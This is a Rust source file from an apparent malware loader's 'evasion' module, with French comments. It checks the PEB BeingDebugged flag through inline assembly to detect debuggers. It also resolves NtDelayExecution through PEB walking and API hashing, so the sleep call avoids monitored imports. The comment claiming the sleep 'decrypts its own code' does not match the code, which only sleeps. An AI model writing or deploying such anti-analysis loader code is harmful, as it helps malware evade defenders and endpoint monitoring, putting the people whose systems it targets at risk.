// loader/src/evasion/anti_debug.rs

pub fn check_debugger() -> bool {
     unsafe {
        // Check PEB BeingDebugged flag
        #[cfg(target_arch = "x86_64")]
        let peb: *mut u8;
        std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
        let being_debugged = *peb.add(0x2);
        being_debugged != 0
    }
}

use crate::native::peb_parsing_by_hash::{find_function_by_hash, simple_hash, find_ntdll_simple};
use std::mem::transmute;
    
// Fonction de sleep qui déchiffre son propre code
pub fn encrypted_sleep(ms: u32) {
    unsafe {
        // Trouver l'adresse de ntdll.dll
        let ntdll_base = match find_ntdll_simple() {
            Some(addr) => addr,
            None => {
                return;
            }
        };

        // Trouver l'adresse de NtDelayExecution via son hash
        let nt_delay_hash = simple_hash("NtDelayExecution");
        let nt_delay_addr = match find_function_by_hash(ntdll_base, nt_delay_hash) {
            Some(addr) => addr,
            None => {
                return;
            }
        };

        let nt_delay: extern "system" fn(u8, *mut i64) -> i32 = transmute(nt_delay_addr);

        // Préparer le délai en 100-nanosecondes négatives
        let mut interval: i64 = -1 * (ms as i64) * 10_000; // Convertir ms en 100-nanosecondes

        // Appeler NtDelayExecution
        let status = nt_delay(0, &mut interval as *mut i64);
        if status != 0 {
            return;
        }
    }
}